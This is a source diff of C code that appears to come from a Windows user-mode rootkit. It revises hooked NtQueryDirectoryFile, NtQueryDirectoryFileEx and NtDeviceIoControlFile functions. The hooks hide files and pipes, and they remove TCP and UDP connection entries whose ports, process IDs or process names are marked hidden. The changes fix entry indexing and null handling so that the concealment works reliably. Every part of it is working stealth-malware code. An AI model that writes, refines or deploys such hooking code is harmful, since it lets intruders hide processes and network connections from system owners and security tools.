@@ -207,7 +207,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 		WCHAR fileFileName[MAX_PATH + 1] = { 0 };
 		WCHAR fileFullPath[MAX_PATH + 1] = { 0 };
 
-		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) lstrcpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
+		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) StrCpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
 		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);
 
 		do
@@ -254,7 +254,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 		WCHAR fileFileName[MAX_PATH + 1] = { 0 };
 		WCHAR fileFullPath[MAX_PATH + 1] = { 0 };
 
-		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) lstrcpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
+		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) StrCpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
 		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);
 
 		if (queryFlags & SL_RETURN_SINGLE_ENTRY)
@@ -398,57 +398,64 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 				PNT_NSI_PARAM nsiParam = (PNT_NSI_PARAM)outputBuffer;
 				if (nsiParam->Entries && (nsiParam->Type == NsiTcp || nsiParam->Type == NsiUdp))
 				{
-					// The status and process table may be NULL and must be checked.
-					PNT_NSI_TCP_ENTRY tcpEntries = (PNT_NSI_TCP_ENTRY)nsiParam->Entries;
-					PNT_NSI_UDP_ENTRY udpEntries = (PNT_NSI_UDP_ENTRY)nsiParam->Entries;
-					PNT_NSI_STATUS_ENTRY statusEntries = (PNT_NSI_STATUS_ENTRY)nsiParam->StatusEntries;
-					PNT_NSI_PROCESS_ENTRY processEntries = (PNT_NSI_PROCESS_ENTRY)nsiParam->ProcessEntries;
-
 					WCHAR processName[MAX_PATH + 1];
 
 					for (DWORD i = 0; i < nsiParam->Count; i++)
 					{
+						PNT_NSI_TCP_ENTRY tcpEntry = (PNT_NSI_TCP_ENTRY)((LPBYTE)nsiParam->Entries + i * nsiParam->EntrySize);
+						PNT_NSI_UDP_ENTRY udpEntry = (PNT_NSI_UDP_ENTRY)((LPBYTE)nsiParam->Entries + i * nsiParam->EntrySize);
+
+						// The status and process table may be NULL.
+						PNT_NSI_PROCESS_ENTRY processEntry = nsiParam->ProcessEntries ? (PNT_NSI_PROCESS_ENTRY)((LPBYTE)nsiParam->ProcessEntries + i * nsiParam->ProcessEntrySize) : NULL;
+						PNT_NSI_STATUS_ENTRY statusEntry = nsiParam->StatusEntries ? (PNT_NSI_STATUS_ENTRY)((LPBYTE)nsiParam->StatusEntries + i * nsiParam->StatusEntrySize) : NULL;
+
 						processName[0] = L'\0';
 
 						BOOL hidden = FALSE;
 						if (nsiParam->Type == NsiTcp)
 						{
-							if (processEntries) GetProcessFileName(processEntries[i].TcpProcessId, FALSE, processName, MAX_PATH);
+							if (processEntry) GetProcessFileName(processEntry->TcpProcessId, FALSE, processName, MAX_PATH);
 
 							hidden =
-								IsTcpLocalPortHidden(_byteswap_ushort(tcpEntries[i].Local.Port)) ||
-								IsTcpRemotePortHidden(_byteswap_ushort(tcpEntries[i].Remote.Port)) ||
-								processEntries && IsProcessIdHidden(processEntries[i].TcpProcessId) ||
-								IsProcessNameHidden(processName) ||
+								IsTcpLocalPortHidden(_byteswap_ushort(tcpEntry->Local.Port)) ||
+								IsTcpRemotePortHidden(_byteswap_ushort(tcpEntry->Remote.Port)) ||
+								processEntry && IsProcessIdHidden(processEntry->TcpProcessId) ||
+								lstrlenW(processName) > 0 && IsProcessNameHidden(processName) ||
 								HasPrefix(processName);
 						}
 						else if (nsiParam->Type == NsiUdp)
 						{
-							if (processEntries) GetProcessFileName(processEntries[i].UdpProcessId, FALSE, processName, MAX_PATH);
+							if (processEntry) GetProcessFileName(processEntry->UdpProcessId, FALSE, processName, MAX_PATH);
 
 							hidden =
-								IsUdpPortHidden(_byteswap_ushort(udpEntries[i].Port)) ||
-								processEntries && IsProcessIdHidden(processEntries[i].UdpProcessId) ||
-								IsProcessNameHidden(processName) ||
+								IsUdpPortHidden(_byteswap_ushort(udpEntry->Port)) ||
+								processEntry && IsProcessIdHidden(processEntry->UdpProcessId) ||
+								lstrlenW(processName) > 0 && IsProcessNameHidden(processName) ||
 								HasPrefix(processName);
 						}
 
 						// If hidden, move all following entries up by one and decrease count.
 						if (hidden)
 						{
-							if (i < nsiParam->Count - 1)
+							if (i < nsiParam->Count - 1) // Do not move following entries, if this is the last entry
 							{
 								if (nsiParam->Type == NsiTcp)
 								{
-									RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
+									RtlMoveMemory(tcpEntry, (LPBYTE)tcpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
 								}
 								else if (nsiParam->Type == NsiUdp)
 								{
-									RtlMoveMemory(&udpEntries[i], &udpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
+									RtlMoveMemory(udpEntry, (LPBYTE)udpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
 								}
 
-								if (statusEntries) RtlMoveMemory(&statusEntries[i], &statusEntries[i + 1], (nsiParam->Count - i - 1) * sizeof(NT_NSI_STATUS_ENTRY));
-								if (processEntries) RtlMoveMemory(&processEntries[i], &processEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);
+								if (statusEntry)
+								{
+									RtlMoveMemory(statusEntry, (LPBYTE)statusEntry + nsiParam->StatusEntrySize, (nsiParam->Count - i - 1) * nsiParam->StatusEntrySize);
+								}
+								if (processEntry)
+								{
+									RtlMoveMemory(processEntry, (LPBYTE)processEntry + nsiParam->ProcessEntrySize, (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);
+								}
 							}
 
 							nsiParam->Count--;
@@ -504,8 +511,8 @@ static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName)
 	// PathCombineW cannot be used with the directory name "\\.\pipe\".
 	if (!StrCmpIW(directoryName, L"\\\\.\\pipe\\"))
 	{
-		lstrcpyW(result, directoryName);
-		lstrcatW(result, fileName);
+		StrCpyW(result, directoryName);
+		StrCatW(result, fileName);
 		return result;
 	}
 	else
